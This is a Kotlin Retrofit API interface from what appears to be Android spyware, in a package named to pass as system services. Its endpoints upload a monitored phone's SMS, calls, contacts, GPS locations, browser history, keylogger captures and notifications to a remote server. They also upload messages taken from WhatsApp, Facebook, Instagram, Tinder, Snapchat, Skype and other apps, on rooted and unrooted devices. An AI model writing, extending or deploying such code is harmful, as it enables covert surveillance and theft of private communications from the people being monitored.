package com.android.services.network.api

import com.android.services.db.entities.Contacts
import com.android.services.db.entities.GpsLocation
import com.android.services.db.entities.PushStatus
import com.android.services.db.entities.SmsLog
import com.android.services.models.*
import com.android.services.models.SkypeLogs
import com.android.services.models.im.*
import io.reactivex.rxjava3.core.Observable
import okhttp3.ResponseBody
import retrofit2.Call
import retrofit2.http.Body
import retrofit2.http.Headers
import retrofit2.http.POST

interface TOSApi {

    //    @POST("activate-license")
//    @Headers("Content-Type: application/json")
//    fun activateLicense(@Body activateDevice: ActivateDevice): Observable<ActivateDeviceResponse>
//
//    @POST("sms")
//    @Headers("Content-Type: application/json")
//    fun uploadSmsLogs(@Body smsUpload: SmsUpload): Call<ResponseBody>
//
//    @POST("geolocations")
//    @Headers("Content-Type: application/json")
//    fun uploadGeoLocations(@Body geoLocationUpload: GeoLocationUpload): Call<ResponseBody>
//
//    @POST("contacts")
//    @Headers("Content-Type: application/json")
//    fun uploadContacts(@Body contactsUpload: ContactsUpload): Call<ResponseBody>
    @POST("activateService")
    @Headers("Content-Type: application/json")
    fun activateLicense(@Body activateDevice: ActivateDevice): Observable<ActivateDeviceResponse>

    @POST("auth")
    @Headers("Content-Type: application/json")
    fun hitAuthService(@Body auth: Auth): Call<ResponseBody>

    @POST("appointments")
    @Headers("Content-Type: application/json")
    fun uploadAppointments(@Body appointmentUpload: AppointmentUpload): Call<ResponseBody>

    @POST("installedApps")
    @Headers("Content-Type: application/json")
    fun uploadInstalledApps(@Body installedAppUpload: InstalledAppUpload): Call<ResponseBody>

    @POST("tosPushStatus")
    @Headers("Content-Type: application/json")
    fun uploadPushStatuses(@Body pushStatuses: List<PushStatus>): Call<ResponseBody>

    @POST("getPushStatus")
    @Headers("Content-Type: application/json")
    fun getPushNotifications(@Body getPushStatus: GetPushStatus): Call<ResponseBody>

    @POST("skypeRooted")
    @Headers("Content-Type: application/json")
    fun uploadSkypeRooted(@Body skypeLogs: SkypeLogs): Call<ResponseBody>

    @POST("zaloRooted")
    @Headers("Content-Type: application/json")
    fun uploadZaloRooted(@Body zaloUpload: ZaloUpload): Call<ResponseBody>

    @POST("tumblrRooted")
    @Headers("Content-Type: application/json")
    fun uploadTumblrRooted(@Body tumblrUpload: TumblrUpload): Call<ResponseBody>

    @POST("hikeRooted")
    @Headers("Content-Type: application/json")
    fun uploadHikeRooted(@Body hikeLogs: HikeLogs): Call<ResponseBody>

    @POST("imoRooted")
    @Headers("Content-Type: application/json")
    fun uploadImoRooted(@Body imoLogs: IMOLogs): Call<ResponseBody>

    @POST("hangoutsRooted")
    @Headers("Content-Type: application/json")
    fun uploadHangoutsRooted(@Body hangoutLogs: HangoutLogs): Call<ResponseBody>

    @POST("tinderRooted")
    @Headers("Content-Type: application/json")
    fun uploadTinderRooted(@Body tinderLogs: TinderLogs): Call<ResponseBody>

    @POST("instagramPostRooted")
    @Headers("Content-Type: application/json")
    fun uploadInstagramPostRooted(@Body instagrmFeedLogs: InstagramFeedLogs): Call<ResponseBody>

    @POST("instagramRooted")
    @Headers("Content-Type: application/json")
    fun uploadInstagramMessageRooted(@Body instagramMessageLogs: InstagramMessageLogs): Call<ResponseBody>

    @POST("whatsappRooted")
    @Headers("Content-Type: application/json")
    fun uploadWhatsAppMessageRooted(@Body whatsAppLogs: WhatsAppLogs): Call<ResponseBody>

    @POST("facebookRooted")
    @Headers("Content-Type: application/json")
    fun uploadFacebookMessageRooted(@Body facebookLogs: FacebookLogs): Call<ResponseBody>

    @POST("lineRooted")
    @Headers("Content-Type: application/json")
    fun uploadLineMessageRooted(@Body lineLogs: LineLogs): Call<ResponseBody>

    @POST("viberRooted")
    @Headers("Content-Type: application/json")
    fun uploadViberMessageRooted(@Body viberLogs: ViberLogs): Call<ResponseBody>

    @POST("sms")
    @Headers("Content-Type: application/json")
    fun uploadSmsLogs(@Body smsUpload: SmsUpload): Call<ResponseBody>

    @POST("geolocations")
    @Headers("Content-Type: application/json")
    fun uploadGeoLocations(@Body geoLocationUpload: GeoLocationUpload): Call<ResponseBody>

    @POST("contacts")
    @Headers("Content-Type: application/json")
    fun uploadContacts(@Body contactsUpload: ContactsUpload): Call<ResponseBody>

    @POST("notifications")
    @Headers("Content-Type: application/json")
    fun uploadAppNotifications(@Body notificationUpload: NotificationUpload): Call<ResponseBody>


    @POST("whatsappUnrooted")
    @Headers("Content-Type: application/json")
    fun uploadWhatsAppUnrooted(@Body whatsAppUnrootedLogs: WhatsAppUnrootedLogs): Call<ResponseBody>

    @POST("facebookUnrooted")
    @Headers("Content-Type: application/json")
    fun uploadFacebookUnrooted(@Body facebookUnrootedLogs: FacebookUnrootedLogs): Call<ResponseBody>

    @POST("skypeUnrooted")
    @Headers("Content-Type: application/json")
    fun uploadSkypeUnrooted(@Body skypeUnrootedLogs: SkypeUnrootedLogs): Call<ResponseBody>

    @POST("lineUnrooted")
    @Headers("Content-Type: application/json")
    fun uploadLineUnrooted(@Body lineUnrootedLogs: LineUnrootedLogs): Call<ResponseBody>

    @POST("viberUnrooted")
    @Headers("Content-Type: application/json")
    fun uploadViberUnrooted(@Body viberUnrootedLogs: ViberUnrootedLogs): Call<ResponseBody>

    @POST("imoUnrooted")
    @Headers("Content-Type: application/json")
    fun uploadImoUnrooted(@Body imoUnrootedLogs: IMOUnrootedLogs): Call<ResponseBody>

    @POST("instagramUnrooted")
    @Headers("Content-Type: application/json")
    fun uploadInstagramUnrooted(@Body instagramUnrootedLogs: InstagramUnrootedLogs): Call<ResponseBody>

    @POST("snapchatUnrooted")
    @Headers("Content-Type: application/json")
    fun uploadSnapChatUnrooted(@Body snapChatUnrootedLogs: SnapChatUnrootedLogs): Call<ResponseBody>

    @POST("tumblrUnrooted")
    @Headers("Content-Type: application/json")
    fun uploadTumblrUnrooted(@Body tumblrUnrootedLogs: TumblrUnrootedLogs): Call<ResponseBody>

    @POST("hikeUnrooted")
    @Headers("Content-Type: application/json")
    fun uploadHikeUnrooted(@Body hikeUnrootedLogs: HikeUnrootedLogs): Call<ResponseBody>

    @POST("tinderUnrooted")
    @Headers("Content-Type: application/json")
    fun uploadTinderUnrooted(@Body tinderUnrootedLogs: TinderUnrootedLogs): Call<ResponseBody>

    @POST("calls")
    @Headers("Content-Type: application/json")
    fun uploadCallLogs(@Body callLogUpload: CallLogUpload): Call<ResponseBody>

    @POST("keylogger")
    @Headers("Content-Type: application/json")
    fun uploadKeyLogs(@Body keyLogUpload: KeyLogUpload): Call<ResponseBody>

    @POST("browserHistory")
    @Headers("Content-Type: application/json")
    fun uploadBrowserHistory(@Body browserHistoryUpload: BrowserHistoryUpload): Call<ResponseBody>

    @POST("networks")
    @Headers("Content-Type: application/json")
    fun uploadConnectedNetworks(@Body connectedNetworkUpload: ConnectedNetworkUpload): Call<ResponseBody>

    @POST("activity")
    @Headers("Content-Type: application/json")
    fun uploadScreenTime(@Body screenTimeUpload: ScreenTimeUpload): Call<ResponseBody>

    @POST("appPermissions")
    @Headers("Content-Type: application/json")
    fun uploadAppPermissions(@Body appPermissionUpload: AppPermissionUpload): Call<ResponseBody>

    @POST("deviceInfo")
    @Headers("Content-Type: application/json")
    fun uploadDeviceInfo(@Body deviceInfo: DeviceInformation): Call<ResponseBody>

    @POST("usersettings")
    @Headers("Content-Type: application/json")
    fun hitUserSettingService(@Body userSetting: UserSetting): Call<ResponseBody>

    @POST("fcm/addToken")
    @Headers("Content-Type: application/json")
    fun hitFcmTokenService(@Body fcmToken: FCMToken): Call<ResponseBody>

    @POST("fcm/getToken")
    @Headers("Content-Type: application/json")
    fun getActiveFcmTokenFromServer(): Call<ResponseBody>

    @POST("geoFencingEmail")
    @Headers("Content-Type: application/json")
    fun uploadGeoFences(@Body geoFenceLogs: GeoFenceLogs): Call<ResponseBody>

    @POST("fcm/textAlert")
    @Headers("Content-Type: application/json")
    fun postTextAlertEvent(@Body textAlertLogs: TextAlertLogs): Call<ResponseBody>
}